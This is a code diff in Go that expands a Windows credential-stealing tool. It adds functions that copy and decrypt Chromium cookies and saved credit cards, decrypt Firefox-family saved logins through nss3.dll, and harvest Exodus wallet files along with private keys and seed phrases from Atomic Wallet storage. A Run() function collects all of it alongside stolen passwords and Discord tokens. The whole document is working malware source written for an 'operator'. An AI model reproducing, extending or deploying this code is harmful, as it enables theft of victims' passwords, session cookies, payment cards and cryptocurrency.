@@ -29,9 +29,37 @@ type Credential struct {
 	Password string `json:"password"`
 }
 
+type Cookie struct {
+	Browser  string `json:"browser"`
+	Profile  string `json:"profile"`
+	Host     string `json:"host"`
+	Name     string `json:"name"`
+	Value    string `json:"value"`
+	Path     string `json:"path"`
+	IsSecure bool   `json:"isSecure"`
+}
+
+type Card struct {
+	Browser     string `json:"browser"`
+	Profile     string `json:"profile"`
+	Name        string `json:"name"`
+	Number      string `json:"number"`
+	ExpiryMonth int    `json:"expiryMonth"`
+	ExpiryYear  int    `json:"expiryYear"`
+}
+
+type WalletFile struct {
+	Wallet   string `json:"wallet"`
+	Filename string `json:"filename"`
+	DataB64  string `json:"dataB64"`
+}
+
 type Result struct {
 	Credentials []Credential `json:"credentials"`
+	Cookies     []Cookie     `json:"cookies"`
+	Cards       []Card       `json:"cards"`
 	Tokens      []string     `json:"tokens"`
+	Wallets     []WalletFile `json:"wallets"`
 	Errors      []string     `json:"errors"`
 }
 
@@ -70,8 +98,6 @@ func dpapi(ct []byte) ([]byte, error) {
 }
 
 // ── Minimal SQLite3 reader (no external dependencies) ────────────
-// Handles table B-trees without overflow pages — sufficient for
-// Chrome Login Data which is typically a few hundred KB.
 
 func sqReadVarint(b []byte) (int64, int) {
 	var v int64
@@ -87,8 +113,6 @@ func sqReadVarint(b []byte) (int64, int) {
 	return v, 1
 }
 
-// sqParseRecord parses a SQLite record payload.
-// Returns: nil | int64 | string | []byte per column.
 func sqParseRecord(b []byte) []interface{} {
 	if len(b) == 0 {
 		return nil
@@ -139,13 +163,12 @@ func sqParseRecord(b []byte) []interface{} {
 			for _, c := range chunk {
 				v = (v << 8) | int64(c)
 			}
-			// sign-extend
 			if sz > 0 && sz < 8 && chunk[0]&0x80 != 0 {
 				v |= -(int64(1) << (uint(sz) * 8))
 			}
 			rec[i] = v
 		case t == 7:
-			// float — not needed, leave nil
+			// float — not needed
 		case t >= 12 && t%2 == 0:
 			cp := make([]byte, sz)
 			copy(cp, chunk)
@@ -158,14 +181,12 @@ func sqParseRecord(b []byte) []interface{} {
 	return rec
 }
 
-// sqWalk walks a table B-tree rooted at pageNum and returns all leaf cell payloads.
 func sqWalk(data []byte, pageSize, pageNum int) [][]byte {
 	off := (pageNum - 1) * pageSize
 	if off+pageSize > len(data) {
 		return nil
 	}
 	page := data[off : off+pageSize]
-	// Page 1 has a 100-byte SQLite file header before the B-tree header.
 	ho := 0
 	if pageNum == 1 {
 		ho = 100
@@ -177,7 +198,7 @@ func sqWalk(data []byte, pageSize, pageNum int) [][]byte {
 	ncells := int(binary.BigEndian.Uint16(page[ho+3 : ho+5]))
 
 	switch ptype {
-	case 0x0D: // leaf table page
+	case 0x0D: // leaf table
 		var out [][]byte
 		for i := 0; i < ncells; i++ {
 			cpoff := ho + 8 + i*2
@@ -203,7 +224,7 @@ func sqWalk(data []byte, pageSize, pageNum int) [][]byte {
 		}
 		return out
 
-	case 0x05: // interior table page
+	case 0x05: // interior table
 		if len(page) < ho+12 {
 			return nil
 		}
@@ -226,13 +247,47 @@ func sqWalk(data []byte, pageSize, pageNum int) [][]byte {
 	return nil
 }
 
-// sqColIndices parses a CREATE TABLE statement to find column indices.
-// Falls back to Chrome defaults (0, 3, 5) if parsing fails.
-func sqColIndices(sql string) (urlIdx, userIdx, passIdx int) {
-	urlIdx, userIdx, passIdx = 0, 3, 5
+// sqOpenDB reads a SQLite file and returns (data, pageSize, error).
+func sqOpenDB(path string) ([]byte, int, error) {
+	data, err := os.ReadFile(path)
+	if err != nil {
+		return nil, 0, err
+	}
+	if len(data) < 100 || string(data[:16]) != "SQLite format 3\x00" {
+		return nil, 0, fmt.Errorf("not sqlite3")
+	}
+	ps := int(binary.BigEndian.Uint16(data[16:18]))
+	if ps == 1 {
+		ps = 65536
+	}
+	return data, ps, nil
+}
+
+// sqFindTable locates a table's root page and CREATE SQL from sqlite_master.
+func sqFindTable(data []byte, ps int, tableName string) (rootPage int, createSQL string) {
+	for _, pl := range sqWalk(data, ps, 1) {
+		rec := sqParseRecord(pl)
+		if len(rec) < 5 {
+			continue
+		}
+		t, _ := rec[0].(string)
+		name, _ := rec[1].(string)
+		if t != "table" || !strings.EqualFold(name, tableName) {
+			continue
+		}
+		rp, _ := rec[3].(int64)
+		sql, _ := rec[4].(string)
+		return int(rp), sql
+	}
+	return 0, ""
+}
+
+// sqColMap parses a CREATE TABLE statement and returns a map of column name → index.
+func sqColMap(sql string) map[string]int {
+	m := make(map[string]int)
 	i := strings.Index(sql, "(")
 	if i < 0 {
-		return
+		return m
 	}
 	body := sql[i+1:]
 	if j := strings.LastIndex(body, ")"); j > 0 {
@@ -253,18 +308,13 @@ func sqColIndices(sql string) (urlIdx, userIdx, passIdx int) {
 			continue
 		}
 		col := strings.ToLower(strings.Trim(f[0], "\"'`"))
-		switch col {
-		case "origin_url":
-			urlIdx = idx
-		case "username_value":
-			userIdx = idx
-		case "password_value":
-			passIdx = idx
-		}
+		m[col] = idx
 		idx++
 	}
-	return
+	return m
 }
+
+// ── Login Data (passwords) ────────────────────────────────────────
 
 type loginRow struct {
 	url      string
@@ -273,51 +323,22 @@ type loginRow struct {
 }
 
 func sqReadLogins(path string) ([]loginRow, error) {
-	data, err := os.ReadFile(path)
+	data, ps, err := sqOpenDB(path)
 	if err != nil {
 		return nil, err
 	}
-	if len(data) < 100 || string(data[:16]) != "SQLite format 3\x00" {
-		return nil, fmt.Errorf("not a valid SQLite3 file")
-	}
-	ps := int(binary.BigEndian.Uint16(data[16:18]))
-	if ps == 1 {
-		ps = 65536
-	}
-
-	// Find logins table root page from sqlite_master (page 1).
-	loginsRoot := 0
-	var loginsSQL string
-	for _, pl := range sqWalk(data, ps, 1) {
-		rec := sqParseRecord(pl)
-		if len(rec) < 5 {
-			continue
-		}
-		t, _ := rec[0].(string)
-		name, _ := rec[1].(string)
-		if t != "table" || name != "logins" {
-			continue
-		}
-		rp, _ := rec[3].(int64)
-		loginsRoot = int(rp)
-		loginsSQL, _ = rec[4].(string)
-		break
-	}
-	if loginsRoot == 0 {
+	root, sql := sqFindTable(data, ps, "logins")
+	if root == 0 {
 		return nil, fmt.Errorf("logins table not found")
 	}
-
-	urlIdx, userIdx, passIdx := sqColIndices(loginsSQL)
-	maxIdx := passIdx
-	if urlIdx > maxIdx {
-		maxIdx = urlIdx
-	}
-	if userIdx > maxIdx {
-		maxIdx = userIdx
-	}
+	cols := sqColMap(sql)
+	urlIdx := colIdx(cols, "origin_url", 0)
+	userIdx := colIdx(cols, "username_value", 3)
+	passIdx := colIdx(cols, "password_value", 5)
+	maxIdx := max3(urlIdx, userIdx, passIdx)
 
 	var rows []loginRow
-	for _, pl := range sqWalk(data, ps, loginsRoot) {
+	for _, pl := range sqWalk(data, ps, root) {
 		rec := sqParseRecord(pl)
 		if len(rec) <= maxIdx {
 			continue
@@ -339,7 +360,111 @@ func sqReadLogins(path string) ([]loginRow, error) {
 	return rows, nil
 }
 
-// ── Chrome password decryption ────────────────────────────────────
+// ── Cookies ───────────────────────────────────────────────────────
+
+type cookieRow struct {
+	host     string
+	name     string
+	encValue []byte
+	path     string
+	isSecure bool
+}
+
+func sqReadCookies(path string) ([]cookieRow, error) {
+	data, ps, err := sqOpenDB(path)
+	if err != nil {
+		return nil, err
+	}
+	root, sql := sqFindTable(data, ps, "cookies")
+	if root == 0 {
+		return nil, fmt.Errorf("cookies table not found")
+	}
+	cols := sqColMap(sql)
+	hostIdx := colIdx(cols, "host_key", 1)
+	nameIdx := colIdx(cols, "name", 3)
+	encIdx := colIdx(cols, "encrypted_value", 5)
+	pathIdx := colIdx(cols, "path", 6)
+	secIdx := colIdx(cols, "is_secure", 8)
+	maxIdx := max5(hostIdx, nameIdx, encIdx, pathIdx, secIdx)
+
+	var rows []cookieRow
+	for _, pl := range sqWalk(data, ps, root) {
+		rec := sqParseRecord(pl)
+		if len(rec) <= maxIdx {
+			continue
+		}
+		host, _ := rec[hostIdx].(string)
+		name, _ := rec[nameIdx].(string)
+		path_, _ := rec[pathIdx].(string)
+		var enc []byte
+		switch v := rec[encIdx].(type) {
+		case []byte:
+			enc = v
+		case string:
+			enc = []byte(v)
+		}
+		var sec bool
+		if sv, ok := rec[secIdx].(int64); ok {
+			sec = sv != 0
+		}
+		if host == "" && name == "" {
+			continue
+		}
+		rows = append(rows, cookieRow{host: host, name: name, encValue: enc, path: path_, isSecure: sec})
+	}
+	return rows, nil
+}
+
+// ── Credit Cards ──────────────────────────────────────────────────
+
+type cardRow struct {
+	name        string
+	number      []byte
+	expiryMonth int
+	expiryYear  int
+}
+
+func sqReadCards(path string) ([]cardRow, error) {
+	data, ps, err := sqOpenDB(path)
+	if err != nil {
+		return nil, err
+	}
+	root, sql := sqFindTable(data, ps, "credit_cards")
+	if root == 0 {
+		return nil, fmt.Errorf("credit_cards table not found")
+	}
+	cols := sqColMap(sql)
+	nameIdx := colIdx(cols, "name_on_card", 1)
+	monthIdx := colIdx(cols, "expiration_month", 2)
+	yearIdx := colIdx(cols, "expiration_year", 3)
+	numIdx := colIdx(cols, "card_number_encrypted", 4)
+	maxIdx := max4(nameIdx, monthIdx, yearIdx, numIdx)
+
+	var rows []cardRow
+	for _, pl := range sqWalk(data, ps, root) {
+		rec := sqParseRecord(pl)
+		if len(rec) <= maxIdx {
+			continue
+		}
+		name, _ := rec[nameIdx].(string)
+		month, _ := rec[monthIdx].(int64)
+		year, _ := rec[yearIdx].(int64)
+		var enc []byte
+		switch v := rec[numIdx].(type) {
+		case []byte:
+			enc = v
+		case string:
+			enc = []byte(v)
+		}
+		if name == "" && len(enc) == 0 {
+			continue
+		}
+		rows = append(rows, cardRow{name: name, number: enc, expiryMonth: int(month), expiryYear: int(year)})
+	}
+	return rows, nil
+}
+
+// ── Chrome password/cookie/card decryption ────────────────────────
 
 func getMasterKey(userDataPath string) ([]byte, error) {
 	raw, err := os.ReadFile(filepath.Join(userDataPath, "Local State"))
@@ -361,15 +486,14 @@ func getMasterKey(userDataPath string) ([]byte, error) {
 	if len(b64) <= 5 {
 		return nil, fmt.Errorf("key too short")
 	}
-	return dpapi(b64[5:]) // strip "DPAPI" prefix (5 bytes)
+	return dpapi(b64[5:]) // strip "DPAPI" prefix
 }
 
-func decryptPass(masterKey, enc []byte) string {
+func decryptValue(masterKey, enc []byte) string {
 	if len(enc) < 3 {
 		return ""
 	}
 	if string(enc[:3]) == "v10" || string(enc[:3]) == "v20" {
-		// AES-256-GCM: 3-byte version tag + 12-byte nonce + ciphertext+tag
 		if len(enc) < 3+12+16 {
 			return ""
 		}
@@ -387,7 +511,6 @@ func decryptPass(masterKey, enc []byte) string {
 		}
 		return string(plain)
 	}
-	// Legacy format: raw DPAPI blob
 	plain, err := dpapi(enc)
 	if err != nil {
 		return ""
@@ -395,7 +518,7 @@ func decryptPass(masterKey, enc []byte) string {
 	return string(plain)
 }
 
-// ── Browser collection ────────────────────────────────────────────
+// ── Browser definitions ───────────────────────────────────────────
 
 type browserDef struct{ name, path string }
 
@@ -433,6 +556,8 @@ func cpFile(src, dst string) error {
 	return err
 }
 
+// ── Chromium passwords ────────────────────────────────────────────
+
 func stealBrowser(b browserDef, key []byte) []Credential {
 	var creds []Credential
 	for _, profile := range browserProfiles {
@@ -440,7 +565,6 @@ func stealBrowser(b browserDef, key []byte) []Credential {
 		if _, err := os.Stat(src); err != nil {
 			continue
 		}
-		// Chrome locks the live file; copy to temp first.
 		tmp := filepath.Join(os.TempDir(), fmt.Sprintf("ol_%x.tmp", time.Now().UnixNano()))
 		if err := cpFile(src, tmp); err != nil {
 			continue
@@ -451,7 +575,7 @@ func stealBrowser(b browserDef, key []byte) []Credential {
 			continue
 		}
 		for _, r := range rows {
-			pass := decryptPass(key, r.encPass)
+			pass := decryptValue(key, r.encPass)
 			if pass == "" {
 				continue
 			}
@@ -465,6 +589,240 @@ func stealBrowser(b browserDef, key []byte) []Credential {
 		}
 	}
 	return creds
+}
+
+// ── Chromium cookies ──────────────────────────────────────────────
+
+func stealBrowserCookies(b browserDef, key []byte) []Cookie {
+	var cookies []Cookie
+	for _, profile := range browserProfiles {
+		// Chrome moved Cookies into Network/ subdirectory; check both locations.
+		candidates := []string{
+			filepath.Join(b.path, profile, "Network", "Cookies"),
+			filepath.Join(b.path, profile, "Cookies"),
+		}
+		var src string
+		for _, c := range candidates {
+			if _, err := os.Stat(c); err == nil {
+				src = c
+				break
+			}
+		}
+		if src == "" {
+			continue
+		}
+		tmp := filepath.Join(os.TempDir(), fmt.Sprintf("olc_%x.tmp", time.Now().UnixNano()))
+		if err := cpFile(src, tmp); err != nil {
+			continue
+		}
+		rows, err := sqReadCookies(tmp)
+		os.Remove(tmp)
+		if err != nil {
+			continue
+		}
+		for _, r := range rows {
+			value := decryptValue(key, r.encValue)
+			if value == "" {
+				continue
+			}
+			cookies = append(cookies, Cookie{
+				Browser:  b.name,
+				Profile:  profile,
+				Host:     r.host,
+				Name:     r.name,
+				Value:    value,
+				Path:     r.path,
+				IsSecure: r.isSecure,
+			})
+		}
+	}
+	return cookies
+}
+
+// ── Chromium credit cards ─────────────────────────────────────────
+
+func stealBrowserCards(b browserDef, key []byte) []Card {
+	var cards []Card
+	for _, profile := range browserProfiles {
+		src := filepath.Join(b.path, profile, "Web Data")
+		if _, err := os.Stat(src); err != nil {
+			continue
+		}
+		tmp := filepath.Join(os.TempDir(), fmt.Sprintf("olw_%x.tmp", time.Now().UnixNano()))
+		if err := cpFile(src, tmp); err != nil {
+			continue
+		}
+		rows, err := sqReadCards(tmp)
+		os.Remove(tmp)
+		if err != nil {
+			continue
+		}
+		for _, r := range rows {
+			number := decryptValue(key, r.number)
+			if number == "" {
+				continue
+			}
+			cards = append(cards, Card{
+				Browser:     b.name,
+				Profile:     profile,
+				Name:        r.name,
+				Number:      number,
+				ExpiryMonth: r.expiryMonth,
+				ExpiryYear:  r.expiryYear,
+			})
+		}
+	}
+	return cards
+}
+
+// ── Gecko/Firefox (NSS) ───────────────────────────────────────────
+
+// secItem mirrors the NSS SECItem struct on 64-bit Windows.
+// Layout: uint32 type, [4 pad], *byte data, uint32 len
+type secItem struct {
+	itemType uint32
+	_        [4]byte
+	data     *byte
+	length   uint32
+}
+
+func nssDecrypt(pk11Decrypt, secItemFree *syscall.LazyProc, encoded string) string {
+	raw, err := base64.StdEncoding.DecodeString(encoded)
+	if err != nil || len(raw) == 0 {
+		return ""
+	}
+	in := secItem{itemType: 0, data: &raw[0], length: uint32(len(raw))}
+	var out secItem
+	r, _, _ := pk11Decrypt.Call(
+		uintptr(unsafe.Pointer(&in)),
+		uintptr(unsafe.Pointer(&out)),
+		0,
+	)
+	if r != 0 {
+		return ""
+	}
+	if out.data == nil || out.length == 0 {
+		return ""
+	}
+	result := make([]byte, out.length)
+	copy(result, unsafe.Slice(out.data, out.length))
+	secItemFree.Call(uintptr(unsafe.Pointer(&out)), 0)
+	return string(result)
+}
+
+type geckoBrowser struct{ name, profilesDir string }
+
+func geckoBrowsers() []geckoBrowser {
+	roam := os.Getenv("APPDATA")
+	return []geckoBrowser{
+		{"Firefox", filepath.Join(roam, `Mozilla\Firefox\Profiles`)},
+		{"Thunderbird", filepath.Join(roam, `Thunderbird\Profiles`)},
+		{"LibreWolf", filepath.Join(roam, `LibreWolf\Profiles`)},
+		{"Waterfox", filepath.Join(roam, `Waterfox\Profiles`)},
+		{"Pale Moon", filepath.Join(roam, `Moonchild Productions\Pale Moon\Profiles`)},
+	}
+}
+
+func findNSS3() string {
+	candidates := []string{
+		`C:\Program Files\Mozilla Firefox\nss3.dll`,
+		`C:\Program Files (x86)\Mozilla Firefox\nss3.dll`,
+		`C:\Program Files\LibreWolf\nss3.dll`,
+		`C:\Program Files (x86)\LibreWolf\nss3.dll`,
+		`C:\Program Files\Waterfox\nss3.dll`,
+		`C:\Program Files (x86)\Waterfox\nss3.dll`,
+	}
+	for _, p := range candidates {
+		if _, err := os.Stat(p); err == nil {
+			return p
+		}
+	}
+	return ""
+}
+
+func stealGecko() ([]Credential, []string) {
+	nssPath := findNSS3()
+	if nssPath == "" {
+		return nil, nil // no Firefox-family browser installed
+	}
+
+	nss3 := syscall.NewLazyDLL(nssPath)
+	nssInit := nss3.NewProc("NSS_Init")
+	nssShutdown := nss3.NewProc("NSS_Shutdown")
+	pk11GetSlot := nss3.NewProc("PK11_GetInternalKeySlot")
+	pk11CheckPass := nss3.NewProc("PK11_CheckUserPassword")
+	pk11FreeSlot := nss3.NewProc("PK11_FreeSlot")
+	pk11Decrypt := nss3.NewProc("PK11_SDR_Decrypt")
+	secItemFree := nss3.NewProc("SECITEM_FreeItem")
+
+	var creds []Credential
+	var errs []string
+
+	for _, b := range geckoBrowsers() {
+		entries, err := os.ReadDir(b.profilesDir)
+		if err != nil {
+			continue
+		}
+		for _, e := range entries {
+			if !e.IsDir() {
+				continue
+			}
+			profilePath := filepath.Join(b.profilesDir, e.Name())
+			loginsPath := filepath.Join(profilePath, "logins.json")
+			if _, err := os.Stat(loginsPath); err != nil {
+				continue
+			}
+
+			profileC, err := syscall.BytePtrFromString(profilePath)
+			if err != nil {
+				continue
+			}
+			r, _, _ := nssInit.Call(uintptr(unsafe.Pointer(profileC)))
+			if r != 0 {
+				errs = append(errs, fmt.Sprintf("%s/%s: NSS_Init failed", b.name, e.Name()))
+				continue
+			}
+
+			slot, _, _ := pk11GetSlot.Call()
+			if slot != 0 {
+				emptyC, _ := syscall.BytePtrFromString("")
+				pk11CheckPass.Call(slot, uintptr(unsafe.Pointer(emptyC)))
+			}
+
+			loginsData, err := os.ReadFile(loginsPath)
+			if err == nil {
+				var lf struct {
+					Logins []struct {
+						Hostname          string `json:"hostname"`
+						EncryptedUsername string `json:"encryptedUsername"`
+						EncryptedPassword string `json:"encryptedPassword"`
+					} `json:"logins"`
+				}
+				if json.Unmarshal(loginsData, &lf) == nil {
+					for _, login := range lf.Logins {
+						username := nssDecrypt(pk11Decrypt, secItemFree, login.EncryptedUsername)
+						password := nssDecrypt(pk11Decrypt, secItemFree, login.EncryptedPassword)
+						if username == "" && password == "" {
+							continue
+						}
+						creds = append(creds, Credential{
+							Browser:  b.name,
+							Profile:  e.Name(),
+							URL:      login.Hostname,
+							Username: username,
+							Password: password,
+						})
+					}
+				}
+			}
+
+			if slot != 0 {
+				pk11FreeSlot.Call(slot)
+			}
+			nssShutdown.Call()
+		}
+	}
+	return creds, errs
 }
 
 // ── Discord token extraction ──────────────────────────────────────
@@ -506,6 +864,101 @@ func stealDiscord() []string {
 	return tokens
 }
 
+// ── Crypto wallets ────────────────────────────────────────────────
+
+var (
+	ethPrivKeyRe = regexp.MustCompile(`(?i)[0-9a-f]{64}`)
+	wifKeyRe     = regexp.MustCompile(`[5KLc][1-9A-HJ-NP-Za-km-z]{50,51}`)
+	// Atomic / Electrum store seeds in JSON; grab anything that looks like
+	// a 12 or 24-word mnemonic (space-separated lowercase words 3-8 chars).
+	seedPhraseRe = regexp.MustCompile(`[a-z]{3,8}(?: [a-z]{3,8}){11}(?:(?: [a-z]{3,8}){11})?`)
+)
+
+// stealExodus grabs the encrypted wallet files from the Exodus desktop wallet.
+// The .seco files are AES-GCM encrypted; the operator can attempt decryption
+// offline (default Exodus install has no passphrase, key derivable from appdata).
+func stealExodus() []WalletFile {
+	roam := os.Getenv("APPDATA")
+	walletDir := filepath.Join(roam, `Exodus\exodus.wallet`)
+	entries, err := os.ReadDir(walletDir)
+	if err != nil {
+		return nil
+	}
+	var files []WalletFile
+	for _, e := range entries {
+		if e.IsDir() {
+			continue
+		}
+		name := e.Name()
+		// Grab seed/passphrase/key files; skip large asset caches
+		ext := strings.ToLower(filepath.Ext(name))
+		if ext != ".seco" && ext != ".json" && ext != ".seed" {
+			continue
+		}
+		fullPath := filepath.Join(walletDir, name)
+		data, err := os.ReadFile(fullPath)
+		if err != nil || len(data) == 0 || len(data) > 256*1024 {
+			continue
+		}
+		files = append(files, WalletFile{
+			Wallet:   "Exodus",
+			Filename: name,
+			DataB64:  base64.StdEncoding.EncodeToString(data),
+		})
+	}
+	return files
+}
+
+// stealAtomic scans Atomic Wallet's LevelDB for private keys and seed phrases.
+func stealAtomic() []WalletFile {
+	roam := os.Getenv("APPDATA")
+	dirs := []string{
+		filepath.Join(roam, `atomic\Local Storage\leveldb`),
+		filepath.Join(roam, `atomic wallet\Local Storage\leveldb`),
+	}
+	seen := make(map[string]struct{})
+	var results []WalletFile
+	for _, dir := range dirs {
+		entries, err := os.ReadDir(dir)
+		if err != nil {
+			continue
+		}
+		for _, e := range entries {
+			n := e.Name()
+			if !strings.HasSuffix(n, ".ldb") && !strings.HasSuffix(n, ".log") {
+				continue
+			}
+			data, err := os.ReadFile(filepath.Join(dir, n))
+			if err != nil {
+				continue
+			}
+			// Extract ETH private keys, WIF keys, and seed phrases
+			for _, m := range ethPrivKeyRe.FindAll(data, -1) {
+				k := strings.ToLower(string(m))
+				if _, dup := seen[k]; !dup {
+					seen[k] = struct{}{}
+					results = append(results, WalletFile{Wallet: "Atomic", Filename: "eth_key", DataB64: base64.StdEncoding.EncodeToString(m)})
+				}
+			}
+			for _, m := range wifKeyRe.FindAll(data, -1) {
+				k := string(m)
+				if _, dup := seen[k]; !dup {
+					seen[k] = struct{}{}
+					results = append(results, WalletFile{Wallet: "Atomic", Filename: "wif_key", DataB64: base64.StdEncoding.EncodeToString(m)})
+				}
+			}
+			for _, m := range seedPhraseRe.FindAll(data, -1) {
+				k := string(m)
+				if _, dup := seen[k]; !dup {
+					seen[k] = struct{}{}
+					results = append(results, WalletFile{Wallet: "Atomic", Filename: "seed", DataB64: base64.StdEncoding.EncodeToString(m)})
+				}
+			}
+		}
+	}
+	return results
+}
+
 // ── Entry point ───────────────────────────────────────────────────
 
 func Run() Result {
@@ -520,7 +973,43 @@ func Run() Result {
 			continue
 		}
 		r.Credentials = append(r.Credentials, stealBrowser(b, key)...)
+		r.Cookies = append(r.Cookies, stealBrowserCookies(b, key)...)
+		r.Cards = append(r.Cards, stealBrowserCards(b, key)...)
 	}
+
+	geckoCreds, geckoErrs := stealGecko()
+	r.Credentials = append(r.Credentials, geckoCreds...)
+	r.Errors = append(r.Errors, geckoErrs...)
+
 	r.Tokens = stealDiscord()
+	r.Wallets = append(r.Wallets, stealExodus()...)
+	r.Wallets = append(r.Wallets, stealAtomic()...)
 	return r
+}
+
+// ── Helpers ───────────────────────────────────────────────────────
+
+func colIdx(m map[string]int, name string, fallback int) int {
+	if i, ok := m[name]; ok {
+		return i
+	}
+	return fallback
+}
+
+func max3(a, b, c int) int {
+	if b > a {
+		a = b
+	}
+	if c > a {
+		a = c
+	}
+	return a
+}
+
+func max4(a, b, c, d int) int {
+	return max3(max3(a, b, c), d, d)
+}
+
+func max5(a, b, c, d, e int) int {
+	return max3(max4(a, b, c, d), e, e)
 }
